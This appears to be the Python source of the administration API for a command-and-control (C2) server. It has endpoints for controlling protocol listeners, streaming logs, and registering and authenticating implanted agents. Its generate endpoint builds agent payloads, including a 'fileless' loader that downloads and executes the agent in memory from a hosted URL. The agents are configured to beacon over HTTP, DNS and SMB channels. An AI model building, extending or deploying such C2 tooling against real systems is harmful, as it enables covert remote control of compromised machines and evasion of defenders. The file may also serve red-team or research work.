"""
C2.Backend.API.admin_api.py

This module defines the FastAPI application responsible for administering the
C2 server. It includes endpoints for monitoring server status, configuring and
controlling protocol execution, real-time log streaming, and agent management
(registration, authentication, and listing).
"""
#!/usr/bin/env python3

import asyncio
import os
import aiofiles
from pydantic import BaseModel
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware

from C2.Backend.utils.logging_config import loggers
from C2.Backend.utils.config import load_config
from C2.Backend.utils.manager import protocol_manager
from C2.Backend.API.agent_manager_pg import init_db, register_agent, authenticate_agent, list_agents

# Initialize FastAPI application
app = FastAPI(title="C2 Admin API", version="1.0.0")

# Enable Cross-Origin Resource Sharing (CORS) for frontend communication
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3001"],  # Allows requests from the React dev server
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Load configuration settings
config = load_config()
logger = loggers["c2server"]

@app.get("/api/status")
def status():
    """
    Return the current operational status of the protocol manager.

    Returns:
        dict: A JSON response indicating whether protocols are running.
        Example: {"running": true}
    """
    return {"running": protocol_manager.running}


@app.websocket("/ws/logs")
async def websocket_logs(websocket: WebSocket):
    """
    WebSocket endpoint for real-time log streaming. It continuously reads
    from the server's log file and sends new log entries to the client.

    Args:
        websocket (WebSocket): The WebSocket connection instance.

    Raises:
        WebSocketDisconnect: If the client disconnects.
        Exception: For any other error while reading or sending logs.
    """
    await websocket.accept()
    log_file_path = config["LOGGING_FILE_PATH"]

    # Ensure the log file exists before attempting to read
    if not os.path.exists(log_file_path):
        open(log_file_path, "w").close()

    try:
        async with aiofiles.open(log_file_path, "r") as afp:
            # Move to the end of the file for the latest logs
            await afp.seek(0, os.SEEK_END)
            while True:
                line = await afp.readline()
                if line:
                    await websocket.send_text(line)
                else:
                    await asyncio.sleep(0.5)
    except WebSocketDisconnect:
        logger.info("WebSocket disconnected.")
    except Exception as e:
        logger.error(f"Error in websocket_logs: {e}")


@app.get("/api/config")
def get_config():
    """
    Retrieve the current configuration settings from the server.

    Returns:
        dict: A JSON object containing configuration key-value pairs.
    """
    return config


@app.post("/api/control/{action}")
async def control_server(action: str):
    """
    Control the C2 server's protocol execution by starting, stopping,
    or restarting all registered protocols.

    Args:
        action (str): The control action, one of ["start", "stop", "restart"].

    Returns:
        dict: A JSON response indicating success.

    Raises:
        HTTPException: If an invalid action is supplied or if the action fails.
    """
    if action not in ["start", "stop", "restart"]:
        raise HTTPException(status_code=400, detail="Invalid action")

    try:
        if action == "start":
            asyncio.create_task(protocol_manager.start_all())
        elif action == "stop":
            asyncio.create_task(protocol_manager.stop_all())
        else:  # restart
            await protocol_manager.stop_all()
            await asyncio.sleep(1)  # Short delay to ensure graceful stop
            asyncio.create_task(protocol_manager.start_all())
    except Exception as e:
        logger.error(f"Error during server control action '{action}': {e}")
        raise HTTPException(status_code=500, detail=f"Failed to {action} server.")

    return {"message": f"{action.capitalize()} triggered successfully!"}


@app.on_event("startup")
def startup_event():
    """
    FastAPI startup event handler. Initializes the database connection
    when the application starts.
    """
    init_db()


class AgentRegistrationRequest(BaseModel):
    """
    Represents the data required to register a new agent.

    Attributes:
        agent_id (str): A unique identifier for the agent.
    """
    agent_id: str


class AgentRegistrationResponse(BaseModel):
    """
    Represents the response data provided after agent registration.

    Attributes:
        auth_token (str): An authentication token issued to the newly registered agent.
    """
    auth_token: str


class AgentAuthRequest(BaseModel):
    """
    Represents the data required for agent authentication.

    Attributes:
        agent_id (str): The unique identifier for the agent.
        auth_token (str): The token previously issued to the agent.
    """
    agent_id: str
    auth_token: str


@app.post("/api/agent/register", response_model=AgentRegistrationResponse)
def api_register_agent(request: AgentRegistrationRequest, req: Request):
    """
    Register a new agent in the system and provide an authentication token.

    Args:
        request (AgentRegistrationRequest): Contains the agent's unique ID.
        req (Request): The incoming HTTP request, used to capture the client's IP address.

    Returns:
        AgentRegistrationResponse: Contains the newly assigned authentication token.
    """
    ip_address = req.client.host
    token = register_agent(request.agent_id, ip_address)
    return AgentRegistrationResponse(auth_token=token)


@app.post("/api/agent/authenticate")
def api_authenticate_agent(request: AgentAuthRequest):
    """
    Authenticate an existing agent using its ID and authentication token.

    Args:
        request (AgentAuthRequest): Contains the agent's ID and token.

    Returns:
        dict: A JSON message indicating successful authentication.

    Raises:
        HTTPException: If authentication fails.
    """
    if authenticate_agent(request.agent_id, request.auth_token):
        return {"message": "Authenticated"}
    raise HTTPException(status_code=401, detail="Authentication failed")


@app.get("/api/agent/list")
def api_list_agents():
    """
    List all registered agents in the system.

    Returns:
        dict: A JSON object containing a list of registered agents.
    """
    agents = list_agents()
    return {"agents": agents}

class AgentGenerationRequest(BaseModel):
    """
    Data required for generating an agent.
    Attributes:
        agent_id (str): Unique identifier for the agent.
        mode (str): "file" for a file-based agent, "fileless" for an in-memory loader.
    """
    agent_id: str
    mode: str  # Expected values: "file" or "fileless"


@app.post("/api/agent/generate")
def api_generate_agent(request: AgentGenerationRequest):
    """
    Generate an agent payload based on operator parameters.
    The server uses a templating engine to produce either a full Python agent script (file-based)
    or a small loader that downloads and executes the agent payload in memory (fileless).
    """
    # Build a default agent configuration. In a production setting, you might use a more dynamic configuration.
    default_agent_config = {
        "agent_id": request.agent_id,
        "auth_token": "sample_token_123",  # This might be generated or passed in a real scenario.
        "poll_interval": 10,
        "protocols": {
            "http": {"enabled": True, "server_url": "http://localhost:8000"},
            "dns": {"enabled": True, "dns_server_ip": "127.0.0.1"},
            "icmp": {"enabled": False, "target_ip": "127.0.0.1"},
            "smb": {"enabled": True, "server_ip": "127.0.0.1"}
        },
        # For fileless agents, this URL should point to the hosted full agent payload.
        "agent_payload_url": "https://yourserver.com/agent_payload.py"
    }
    from Agent.agent_generator import generate_agent  # Ensure this module exists and is in the proper path.
    filename = generate_agent(default_agent_config, request.mode)
    return {"message": f"Agent generated and saved as {filename}"}